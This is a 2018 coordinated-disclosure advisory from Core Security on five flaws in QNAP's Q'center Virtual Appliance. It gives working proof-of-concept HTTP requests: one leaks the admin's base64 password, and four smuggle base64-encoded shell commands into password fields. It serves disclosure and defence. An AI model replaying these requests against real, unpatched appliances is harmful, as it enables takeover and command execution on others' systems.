@@ -1,0 +1,398 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com/
+
+QNAP Qcenter Virtual Appliance Multiple Vulnerabilities
+
+1. *Advisory Information*
+
+Title: QNAP Qcenter Virtual Appliance Multiple Vulnerabilities
+Advisory ID: CORE-2018-0006
+Advisory URL:
+http://www.coresecurity.com/advisories/qnap-qcenter-multiple-vulnerabilities
+Date published: 2018-07-11
+Date of last update: 2018-07-11
+Vendors contacted: QNAP
+Release mode: Coordinated release
+
+2. *Vulnerability Information*
+
+Class: Information Exposure [CWE-200], Command Injection [CWE-77],
+Command Injection [CWE-77], Command Injection [CWE-77],
+Command Injection [CWE-77]
+Impact: Code execution
+Remotely Exploitable: Yes
+Locally Exploitable: Yes
+CVE Name: CVE-2018-0706, CVE-2018-0707, CVE-2018-0708, CVE-2018-0709,
+CVE-2018-0710
+
+3. *Vulnerability Description*
+
+QNAP's website states that:
+
+[1] Q'center Virtual Appliance is a central management platform that
+enables you to consolidate the management of multiple QNAP NAS. The
+Q'center web interface gives you the ease-of-use, cost-efficiency,
+convenience and flexibility to manage multiple NAS, across multiple
+sites, from any internet browser.
+
+The platform's provides centralized web-based administration to manage
+the following features:
+
+- Review HDD S.M.A.R.T. values
+- Monitor system status
+- Manage apps and shared folders
+- Review infographice reports
+
+Multiple vulnerabilities were found in the Q'center Virtual Appliance
+web console that would allow an attacker to execute arbitrary commands
+on the system.
+
+4. *Vulnerable versions*
+
+. Q'center Virtual Appliance Version 1.6.1056 (20170825)
+. Q'center Virtual Appliance Version 1.6.1075 (20171123)
+Other products and versions might be affected, but they were not tested.
+
+5. *Vendor Information, Solutions and Workarounds*
+
+QNAP  published the following Security Note:
+
+. https://www.qnap.com/en-us/security-advisory/nas-201807-10
+
+6. *Credits*
+
+These vulnerabilities were discovered and researched by Ivan Huertas
+from Core Security Consulting Services. The publication of this advisory
+was coordinated by Leandro Cuozzo from Core Advisories Team.
+
+7. *Technical Description / Proof of Concept Code*
+
+QNAP's Q'center Virtual Appliance web console includes a functionality
+that would allow an authenticated attacker to elevate privileges on the
+system. We describe this issue in section 7.1.
+
+Sections 7.2, 7.3, 7.4 and 7.5 show different methods to gain command
+execution.
+
+7.1. *Privilege escalation*
+
+[CVE-2018-0706]
+The application contains an API endpoint that returns information about
+the accounts defined in the database. The information returned is
+informative for all the users except for the admin user, which cames
+with every installation, where an extra field is presented. This extra
+field (new_password) contains the password defined at installation time
+for the admin user encoded in base64.
+
+Any authenticated user could access this API endpoint and retrieve the
+admin user's password, therefore being able to login as an administrator.
+
+The following proof of concept shows a user with viewer access
+retrieving the admin's password encoded in base64 in the new_password
+field.
+
+/-----
+GET /qcenter/hawkeye/v1/account?_dc=1519932315271 HTTP/1.1
+Host: 192.168.1.178
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: https://192.168.1.178/qcenter/
+Cookie: CMS_lang=ENG; AUTHENTICATION=0; TIMEZONE_CODE=17;
+DST_ENABLE=False; user=viewer; CMS_SID=IV4P74Y16X; ROLE=1082130432;
+_ID=5a9847223af7e2034924e7b6; LOGIN_TIME=1519932215818; remember=false
+Connection: close
+
+HTTP/1.1 200 OK
+Date: Thu, 01 Mar 2018 19:23:43 GMT
+Server: Apache
+X-Frame-Options: SAMEORIGIN
+X-XSS-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+Content-Type: application/json
+Content-Length: 878
+Connection: close
+
+{
+"total_count": 2,
+"account": [
+{
+"dst_enable": false,
+"name": "admin",
+"default": true,
+"new_password": "YWRtaW5pc3RyYWRvcg==",
+"authentication": 0,
+"create_time": {
+"$date": 1519917983616
+},
+"role": 4294967295,
+"timezone_code": 17,
+"last_login": {
+"$date": 1519929869797
+},
+"_id": "5a981b9f3af7e2030c883592",
+"email": "",
+"description": "administrator"
+},
+{
+"dst_enable": false,
+"name": "viewer",
+"register_code": "",
+"authentication": 0,
+"create_time": {
+"$date": 1519929122332
+},
+"role": 1082130432,
+"timezone_code": 17,
+"last_login": {
+"$date": 1519932215818
+},
+"_id": "5a9847223af7e2034924e7b6",
+"email": "",
+"description": ""
+}
+]
+}
+-----/
+
+As can be seen in the following excerpt, the decoded base64 data
+corresponds to the plaintext administrator password set at installation
+time.
+
+/-----
+$ echo YWRtaW5pc3RyYWRvcg== | base64 -d
+administrador
+-----/
+
+7.2. *Command Execution in change password for the admin user*
+
+[CVE-2018-0707]
+When the admin user performs a password change, the application executes
+an OS command to impact the changes. The input is not properly sanitized
+when passed down to the OS, allowing an attacker to run arbitrary
+commands.
+
+/-----
+POST /qcenter/hawkeye/v1/account?change_passwd HTTP/1.1
+Host: 192.168.1.209
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Referer: https://192.168.1.209/qcenter/
+Content-Length: 118
+Cookie: CMS_lang=ENG; user=admin; CMS_SID=TWYH7A55X5; ROLE=4294967295;
+_ID=5a8465ba3af7e2030984c84e; LOGIN_TIME=1518714672547;
+AUTHENTICATION=0; TIMEZONE_CODE=17; DST_ENABLE=False; remember=false
+Connection: close
+
+{"_id":"5a8465ba3af7e2030984c84e","old_password":"dGlzMzhhZWw=","new_password":"Ijt0b3VjaCAvdG1wL2NoYW5nZXBhc3M7Ig=="}
+-----/
+
+The API requires to send the password encoded in base64. This makes a
+lot easier to inject command as we do not need to bypass any filters.
+For the admin user in the web application, there is also a backing user
+present on the OS. When a password change is requested for this user,
+the values submitted to the API are included in a "sudo passwd" command,
+where the injection occurs.
+
+In this particular case, the old_password must match the current
+password, which can be obtained by exploiting [CVE-2018-0706].
+
+7.3. *Command Execution in network config update*
+
+[CVE-2018-0708]
+The admin user created at installation time can modify the network
+configuration. In order to do this, the admin has to access the settings
+section which is protected by the OS password (which could be obtained
+using the Privilege Escalation vulnerability described above). However,
+we identified that a user with the Power User profile could also execute
+this function, despite access not being provided through the web
+application interface. This function requires to send the admin user
+password encoded in base64 in the passwd field. This value is then used
+to perform a sudo operation in the OS to change the network settings. We
+used the passwd field to inject command
+(";touch /tmp/netconfigpower; echo "a) and create a file in /tmp/.
+
+/-----
+POST /qcenter/hawkeye/v1/network_config HTTP/1.1
+Host: 192.168.1.178
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Referer: https://192.168.1.178/qcenter/
+Content-Length: 87
+Cookie: CMS_lang=ENG; AUTHENTICATION=0; TIMEZONE_CODE=17;
+DST_ENABLE=False; user=power; CMS_SID=MFVG0R9SMK; ROLE=1610612735;
+_ID=5a9858ad3af7e2034924e7cc; LOGIN_TIME=1519934345000; remember=false
+Connection: close
+
+{"type":"0","dns_type":"0","passwd":"Ijt0b3VjaCAvdG1wL25ldGNvbmZpZ3Bvd2VyOyBlY2hvICJh"}
+-----/
+
+The passwd parameter is used in bash echo command unsanitized.
+
+7.4. *Command Execution in date config update*
+
+[CVE-2018-0709]
+The admin user created at installation time is capable of modifying the
+date configuration. In order to do this, the admin has to access the
+settings section which is protected by the OS password (which could be
+obtained using the Privilege Escalation vulnerability described above).
+However, we identified that a user with the Power User profile could
+execute this function, despite the access is not provided through the
+web application interface. This function requires to submit the admin
+user password encoded in base64 in the passwd field. This value is then
+used to perform a sudo operation in the OS to change the date
+configuration settings. We used the passwd field to inject command
+(";touch /tmp/date_config;echo"lalala) and create a file in /tmp/.
+
+/-----
+POST /qcenter/hawkeye/v1/date_config HTTP/1.1
+Host: 192.168.1.178
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Referer: https://192.168.1.178/qcenter/
+Content-Length: 153
+Cookie: CMS_lang=ENG; AUTHENTICATION=0; TIMEZONE_CODE=17;
+DST_ENABLE=False; user=power; CMS_SID=MFVG0R9SMK; ROLE=1610612735;
+_ID=5a9858ad3af7e2034924e7cc; LOGIN_TIME=1519934345000; remember=false
+Connection: close
+
+{"listValue":18,"type":"1","datefield":1518663600000,"passwd":"Ijt0b3VjaCAvdG1wL2RhdGVfY29uZmlnO2VjaG8ibGFsYWxh","date":"20180215","time":"16:40:31"}
+-----/
+
+The passwd parameter is used in bash echo command unsanitized.
+
+7.5. *Command Execution in SSH settings config update*
+[CVE-2018-0710]
+The admin user created at installation time is capable of modifying the
+SSH configuration. In order to do this, the admin has to access the
+settings section which is protected by the OS password (which could be
+obtained using the Privilege Escalation vulnerability). However, we
+identified that a user with the Power User profile could execute this
+function, despite the access is not provided through the web application
+interface. This function requires to submit the admin user password
+encoded in base64 in the passwd field. This value is then used to
+perform a sudo operation in the OS to change the date configuration
+settings. We used the passwd field to inject command
+("";touch /tmp/ssh; echo "lalalala) and create a file in /tmp/.
+
+/-----
+POST /qcenter/hawkeye/v1/ssh_setting_config HTTP/1.1
+Host: 192.168.1.178
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Referer: https://192.168.1.178/qcenter/
+Content-Length: 82
+Cookie: CMS_lang=ENG; AUTHENTICATION=0; TIMEZONE_CODE=17;
+DST_ENABLE=False; user=power; CMS_SID=MFVG0R9SMK; ROLE=1610612735;
+_ID=5a9858ad3af7e2034924e7cc; LOGIN_TIME=1519934345000; remember=false
+Connection: close
+
+{"ssh_enable":1,"port":22,"passwd":"Ijt0b3VjaCAvdG1wL3NzaDsgZWNobyAibGFsYWxhbGE="}
+-----/
+
+The passwd parameter is used in bash echo command unsanitized.
+
+8. *Report Timeline*
+2018-03-13: Core Security sent an initial notification to QNAP,
+including a draft advisory.
+2018-03-14: QNAP replied that they received the draft version of the
+advisory and that they would review it.
+2018-03-23: Core Security requested a status update.
+2018-04-10: Core Security requested a confirmation about the reported
+vulnerabilities and a tentative timescale to fix them.
+2018-04-12: QNAP answered saying that they were unable to reproduce the
+reported vulnerabilities and asked for more detailed information to
+reproduce them.
+2018-04-13: Core Security sent a more detailed guide to test.
+2018-04-16: QNAP confirmed reception.
+2018-04-26: Core Security requested a status update.
+2018-04-29: QNAP confirmed the reported vulnerabilities and informed
+that their software team were working in a fixed version.
+2018-05-21: Core Security requested a status update.
+2018-05-28: QNAP informed that a new version of Q'center would be
+release by the week of June 4.
+2018-05-28: Core Security thanked for the update and proposed June 13th
+as publication date.
+2018-05-29: QNAP answered saying that the new Q'center release was
+delayed and asked to postpone the publication a week later.
+2018-05-29: Core Security asked for a solidified release date in order
+to go public at the same time.
+2018-06-04: QNAP informed that they didn't have a confirmed date yet.
+2018-06-08: Core Security asked QNAP for a status update.
+2018-06-12: QNAP notified that Q'center was under testing, for that
+reason they didn't have a confirmed release date.
+2018-06-25: Core Security asked again for a status update.
+2018-06-27: QNAP replied that they were expecting to release their
+security advisory next week Thursday or Friday.
+2018-06-28: Core Security informed QNAP that recommend vendors not to
+publish near the weekend and proposed Wednesday July 11th as the
+publication date.
+2018-07-02: Core Security asked for a confirmation about the proposed
+date.
+2018-06-27: QNAP confirmed July 11th as the publication date.
+2018-07-11: Advisory CORE-2018-0006 published.
+
+9. *References*
+
+[1] https://www.qnap.com/solution/qcenter/index.php
+
+10. *About CoreLabs*
+
+CoreLabs, the research center of Core Security, is charged with
+anticipating the future needs and requirements for information security
+technologies.
+We conduct our research in several important areas of computer security
+including system vulnerabilities, cyber attack planning and simulation,
+source code auditing, and cryptography. Our results include problem
+formalization, identification of vulnerabilities, novel solutions and
+prototypes for new technologies. CoreLabs regularly publishes security
+advisories, technical papers, project information and shared software
+tools for public use at:
+http://corelabs.coresecurity.com.
+
+11. *About Core Security*
+
+Core Security provides companies with the security insight they need to
+know who, how, and what is vulnerable in their organization. The
+company's threat-aware, identity & access, network security, and
+vulnerability management solutions provide actionable insight and
+context needed to manage security risks across the enterprise. This
+shared insight gives customers a comprehensive view of their security
+posture to make better security remediation decisions. Better insight
+allows organizations to prioritize their efforts to protect critical
+assets, take action sooner to mitigate access risk, and react faster if
+a breach does occur.
+
+Core Security is headquartered in the USA with offices and operations in
+South America, Europe, Middle East and Asia. To learn more, contact Core
+Security at (678) 304-4500 or info@coresecurity.com
+
+12. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2018 Core Security and
+(c) 2018 CoreLabs, and are licensed under a Creative Commons Attribution
+Non-Commercial Share-Alike 3.0 (United States) License:
+http://creativecommons.org/licenses/by-nc-sa/3.0/us/
